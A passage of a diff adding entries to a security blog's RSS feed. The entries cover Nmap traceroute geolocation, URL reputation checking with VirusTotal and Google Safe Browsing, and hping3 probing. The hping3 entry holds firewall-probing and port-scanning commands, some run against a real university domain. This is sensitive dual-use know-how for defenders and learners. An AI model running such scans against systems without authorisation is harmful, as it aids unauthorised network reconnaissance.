+&lt;h1 id=&#34;nmap-traceroute-geolocation-script&#34;&gt;Nmap: traceroute-geolocation script&lt;/h1&gt;
+
+&lt;p&gt;Pinpoint the nodes and traverse the network path with geo location. Nmap &lt;code&gt;traceroute-geolocation.nse&lt;/code&gt; supports geolocation, it lists the geographic locations of each hop and output the results to KML format plottable on Google Maps.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# nmap --traceroute --script traceroute-geolocation.nse \
+&amp;gt; --script-args &#39;traceroute-geolocation.kmlfile=&amp;lt;target&amp;gt;.kml&#39; &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/nmap-traceroute-nsysu.jpg&#34; alt=&#34;nmap-traceroute-nsysu&#34; /&gt;
+&lt;img src=&#34;https://tzyluen.github.io/img/nmap-traceroute-nsysu-gmap.png&#34; alt=&#34;nmap-traceroute-nsysu-gmap&#34; /&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Tools for scanning malicious urls and websites</title>
+      <link>https://tzyluen.github.io/post/tools-for-scanning-malicious-urls-and-websites/</link>
+      <pubDate>Sun, 06 Dec 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/tools-for-scanning-malicious-urls-and-websites/</guid>
+      <description>
+
+&lt;h1 id=&#34;online-and-web-based&#34;&gt;Online and Web-based&lt;/h1&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.virustotal.com:&#34;&gt;https://www.virustotal.com:&lt;/a&gt; by VirusTotal, a subsidiary of Google&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://exchange.xforce.ibmcloud.com:&#34;&gt;https://exchange.xforce.ibmcloud.com:&lt;/a&gt; by IBM&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://safeweb.norton.com:&#34;&gt;http://safeweb.norton.com:&lt;/a&gt; by Norton, Symantec&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.avgthreatlabs.com/ww-en/website-safety-reports:&#34;&gt;http://www.avgthreatlabs.com/ww-en/website-safety-reports:&lt;/a&gt; by AVG ThreatLabs&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://cymon.io:&#34;&gt;https://cymon.io:&lt;/a&gt; by &lt;a href=&#34;https://eSentire.com&#34;&gt;https://eSentire.com&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://www.reputationauthority.org:&#34;&gt;http://www.reputationauthority.org:&lt;/a&gt; by WatchGuard Technologies&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;http://isitphishing.org:&#34;&gt;http://isitphishing.org:&lt;/a&gt; by &lt;a href=&#34;https://vadesecure.com&#34;&gt;https://vadesecure.com&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&#34;text-mode-based-utility&#34;&gt;Text-mode based Utility&lt;/h1&gt;
+
+&lt;h2 id=&#34;virustotalapi&#34;&gt;VirusTotalApi&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ git clone https://github.com/doomedraven/VirusTotalApi.git
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It is an utility to search on VirusTotal databases [1] for malicious URLs and hashes of known malware. It comes pre-installed in REMnux distro [2], a free Linux Toolkit for reverse engineering and analyzing malware.&lt;/p&gt;
+
+&lt;p&gt;Get VirusTotal public API key from &lt;a href=&#34;https://www.virustotal.com/en/documentation/public-api&#34;&gt;https://www.virustotal.com/en/documentation/public-api&lt;/a&gt; and define the API key in the local config file &lt;code&gt;$HOME/.vtapi&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;[vt]
+apikey=&amp;lt;APIKEY&amp;gt;
+type=public
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;remnux@remnux:~$ vt --url-report malicious-url.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Positive result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/tools-for-scanning-malicious-urls-and-websites-01.png&#34; alt=&#34;tools-for-scanning-malicious-urls-and-websites-01&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Negative result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://tzyluen.github.io/img/tools-for-scanning-malicious-urls-and-websites-02.png&#34; alt=&#34;tools-for-scanning-malicious-urls-and-websites-02&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If the url is not in the database, use the &lt;code&gt;--url-scan&lt;/code&gt; to submit and scan.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;remnux@remnux:~$ vt --url-scan malicious-url.com
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;[1] &lt;a href=&#34;https://www.virustotal.com&#34;&gt;https://www.virustotal.com&lt;/a&gt; &lt;br&gt;
+[2] &lt;a href=&#34;https://remnux.org&#34;&gt;https://remnux.org&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Hping3 use cases</title>
+      <link>https://tzyluen.github.io/post/hping3-use-cases/</link>
+      <pubDate>Sat, 21 Nov 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/hping3-use-cases/</guid>
+      <description>
+
+&lt;h1 id=&#34;hping3-and-the-firewall&#34;&gt;hping3 and the firewall&lt;/h1&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Mode
+  default mode     TCP
+  -0  --rawip      RAW IP mode
+  -1  --icmp       ICMP mode
+  -2  --udp        UDP mode
+  -8  --scan       SCAN mode.
+                   Example: hping --scan 1-30,70-90 -S www.target.host
+  -9  --listen     listen mode
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;icmp-mode&#34;&gt;ICMP mode:&lt;/h2&gt;
+
+&lt;p&gt;The typical &lt;code&gt;ping&lt;/code&gt; utility and the hping3 equivalent, sending ICMP-echo and receiving ICMP-reply:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ ping google.com -c 3
+PING google.com (216.58.196.14) 56(84) bytes of data.
+64 bytes from google.com (216.58.196.14): icmp_seq=1 ttl=57 time=23.0 ms
+64 bytes from google.com (216.58.196.14): icmp_seq=2 ttl=57 time=21.9 ms
+64 bytes from google.com (216.58.196.14): icmp_seq=3 ttl=57 time=25.3 ms
+
+--- google.com ping statistics ---
+3 packets transmitted, 3 received, 0% packet loss, time 2002ms
+rtt min/avg/max/mdev = 21.960/23.479/25.386/1.436 ms
+
+
+$ ping utm.my -c 5
+PING utm.my (161.139.21.51) 56(84) bytes of data.
+
+--- utm.my ping statistics ---
+5 packets transmitted, 0 received, 100% packet loss, time 4103ms
+
+
+$ sudo hping3 -1 utm.my -c 5
+HPING utm.my (eth0 161.139.21.51): icmp mode set, 28 headers + 0 data bytes
+
+--- utm.my hping statistic ---
+5 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If the default ping &amp;lsquo;ICMP echo&amp;rsquo; request was blocked, use other modes and ports.&lt;/p&gt;
+
+&lt;h2 id=&#34;tcp-mode&#34;&gt;TCP mode:&lt;/h2&gt;
+
+&lt;p&gt;TCP ping to port 80&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-S, set SYN flag
+-p, set port number
+-c, count
+
+$ sudo hping3 -S utm.my -p 80 -c 3
+HPING utm.my (enp0s3 161.139.21.51): S set, 40 headers + 0 data bytes
+len=46 ip=161.139.21.51 ttl=57 DF id=0 sport=80 flags=SA seq=0 win=14600 rtt=27.6 ms
+len=46 ip=161.139.21.51 ttl=57 DF id=0 sport=80 flags=SA seq=1 win=14600 rtt=31.4 ms
+len=46 ip=161.139.21.51 ttl=57 DF id=0 sport=80 flags=SA seq=2 win=14600 rtt=135.1 ms
+
+--- utm.my hping statistic ---
+3 packets transmitted, 3 packets received, 0% packet loss
+round-trip min/avg/max = 27.6/64.7/135.1 ms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;the ping responses with &lt;strong&gt;&lt;code&gt;flags=SA&lt;/code&gt;&lt;/strong&gt;, the abbreviated flags are &lt;strong&gt;&lt;code&gt;SYN/ACK&lt;/code&gt;&lt;/strong&gt; from the TCP flags:&lt;/p&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Flag&lt;/th&gt;
+&lt;th&gt;Description&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;CWR&lt;/td&gt;
+&lt;td&gt;Congestion Window Reduced (CWR) flag is set by the sending host to indicate that it received a TCP segment with the ECE flag set.&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;ECE (ECN-Echo)&lt;/td&gt;
+&lt;td&gt;indicate that the TCP peer is ECN capable during 3-way handshake.&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;URG&lt;/td&gt;
+&lt;td&gt;indicates that the URGent pointer field is significant&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;ACK&lt;/td&gt;
+&lt;td&gt;indicates that the ACKnowledgment field is significant (Sometimes abbreviated by tcpdump as &amp;ldquo;.&amp;rdquo;)&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;PSH&lt;/td&gt;
+&lt;td&gt;Push function&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;RST&lt;/td&gt;
+&lt;td&gt;Reset the connection (Seen on rejected connections)&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;SYN&lt;/td&gt;
+&lt;td&gt;Synchronize sequence numbers (Seen on new connections)&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;FIN&lt;/td&gt;
+&lt;td&gt;No more data from sender (Seen after a connection is closed)&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;source: &lt;a href=&#34;https://doc.pfsense.org/index.php/What_are_TCP_Flags&#34;&gt;https://doc.pfsense.org/index.php/What_are_TCP_Flags&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;udp-mode&#34;&gt;UDP mode:&lt;/h2&gt;
+
+&lt;p&gt;UDP ping to port 53 (DNS)&lt;/p&gt;
+
+&lt;p&gt;If port 53 (DNS) is not filtered, but closed/not listening on the server:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;host: 192.168.1.9
+53                         ALLOW IN    Anywhere                  
+53 (v6)                    ALLOW IN    Anywhere (v6)             
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.10:~# nmap -sT -sU 192.168.1.9
+...
+Not shown: 999 open|filtered ports, 995 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+53/tcp   closed domain
+80/tcp   open   http
+3000/tcp closed ppp
+8080/tcp open   http-proxy
+53/udp   closed domain
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;And the TCP responses with &lt;code&gt;RA&lt;/code&gt;, similarly the UDP ping also reponse and both with 0 packet loss.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.10:~# hping3 -S 192.168.1.9 -p 53 -c 1
+HPING 192.168.1.9 (eth0 192.168.1.9): S set, 40 headers + 0 data bytes
+len=46 ip=192.168.1.9 ttl=64 DF id=21027 sport=53 flags=RA seq=0 win=0 rtt=5.8 ms
+
+--- 192.168.1.9 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 5.8/5.8/5.8 ms
+
+
+192.168.1.10:~# hping3 -2 192.168.1.9 -p 53 -c 1
+HPING 192.168.1.9 (eth0 192.168.1.9): udp mode set, 28 headers + 0 data bytes
+ICMP Port Unreachable from ip=192.168.1.9 name=UNKNOWN   
+status=0 port=2391 seq=0
+
+--- 192.168.1.9 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 30.5/30.5/30.5 ms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Likewise, if port 53 (DNS) is filtered (rejected), the response flags would also be &lt;code&gt;RA&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;host: 192.168.1.9
+53/tcp                     REJECT IN   Anywhere                  
+53/udp                     REJECT IN   Anywhere                  
+53/tcp (v6)                REJECT IN   Anywhere (v6)             
+53/udp (v6)                REJECT IN   Anywhere (v6)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.10:~# hping3 -S 192.168.1.9 -p 53 -c 1
+HPING 192.168.1.9 (eth0 192.168.1.9): S set, 40 headers + 0 data bytes
+len=46 ip=192.168.1.9 ttl=64 DF id=0 sport=53 flags=RA seq=0 win=0 rtt=6.2 ms
+
+--- 192.168.1.9 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 6.2/6.2/6.2 ms
+
+
+192.168.1.10:~# hping3 -2 192.168.1.9 -p 53 -c 1
+HPING 192.168.1.9 (eth0 192.168.1.9): udp mode set, 28 headers + 0 data bytes
+ICMP Port Unreachable from ip=192.168.1.9 name=UNKNOWN   
+status=0 port=1480 seq=0
+
+--- 192.168.1.9 hping statistic ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 63.7/63.7/63.7 ms
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;scan-mode&#34;&gt;SCAN mode:&lt;/h2&gt;
+
+&lt;p&gt;low-level automated port scanner (port range), possible to uncover subtle aspects of hosts behind the firewall.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.10:~# hping3 -8 21-80 -S 192.168.1.9
+Scanning 192.168.1.9 (192.168.1.9), port 21-80
+60 ports to scan, use -V to see all the replies
++----+-----------+---------+---+-----+-----+-----+
+|port| serv name |  flags  |ttl| id  | win | len |
++----+-----------+---------+---+-----+-----+-----+
+   22 ssh        : .S..A...  64     0 29200    46
+   80 http       : .S..A...  64     0 29200    46
+All replies received. Done.
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Scanning malicious urls (PhantomJS &#43; Google Safe Browsing API)</title>
+      <link>https://tzyluen.github.io/post/scanning-malicious-urls-phantomjs-google-safe-browsing-api/</link>
+      <pubDate>Wed, 11 Nov 2015 00:00:00 +0800</pubDate>
+      
+      <guid>https://tzyluen.github.io/post/scanning-malicious-urls-phantomjs-google-safe-browsing-api/</guid>
+      <description>
+
+&lt;p&gt;My examples are in JS, on PhantomJS headless browser, it could be easily adapted to other languages. The script traverses a webpage and harvests all the URLs therein to check for malware/malicious sites through the Google Safe Browsing API.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;192.168.1.9:~$ phantomjs chk-malinks.js http://some.malware.site
+1: hshd.io
+2: sourceforge.net
+3: popup.taboola.com
+4: www.geeksvip.com
+5: my.hear.com
+...
+159: nba1001.net
+160: www.pressroomvip.com
+161: tracking.lifestylejournal.com
+162: dsct2.com
+163: www.historynut.com
+164: www.buro247.my
+gsafe response json:{
+  &amp;quot;matches&amp;quot;: [
+    {
+      &amp;quot;threatType&amp;quot;: &amp;quot;MALWARE&amp;quot;,
+      &amp;quot;platformType&amp;quot;: &amp;quot;ANY_PLATFORM&amp;quot;,
+      &amp;quot;threat&amp;quot;: {
+        &amp;quot;url&amp;quot;: &amp;quot;nba1001.net&amp;quot;
+      },
+      &amp;quot;cacheDuration&amp;quot;: &amp;quot;300s&amp;quot;,
+      &amp;quot;threatEntryType&amp;quot;: &amp;quot;URL&amp;quot;
+    }
+  ]
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr /&gt;
+
+&lt;h3 id=&#34;google-safe-browsing&#34;&gt;Google Safe Browsing&lt;/h3&gt;
+
+&lt;p&gt;To use Google Safe Browsing APIs, get the API key from Google Developer Console. [1] The API calls is limit to 500 urls per request, and maximum of 10,000 requests per day.&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Line 7-8 defines the API key and the Google Safe Browsing API URL.&lt;/li&gt;
+&lt;li&gt;Line 67-85 defines the Request settings, and line 71 is the Request header.&lt;/li&gt;
+&lt;li&gt;Line 74-83 is the Request body. The request body includes the client information (ID and version) and the threat information (the list names and the URLs).&lt;/li&gt;
+&lt;li&gt;Line 88-97 make the request to Google Safe Browsing API server.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The rest of the code are auxiliary functions:&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;Line 35-61 parse the webpage, extract and collect URLs.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;script src=&#34;//gist.github.com/tzyluen/4c41d7a0d6002fe828f9d932232813ed.js&#34;&gt;&lt;/script&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;strong&gt;References:&lt;/strong&gt;
+[1] &lt;a href=&#34;https://developers.google.com/safe-browsing/v4/get-started&#34;&gt;https://developers.google.com/safe-browsing/v4/get-started&lt;/a&gt;&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
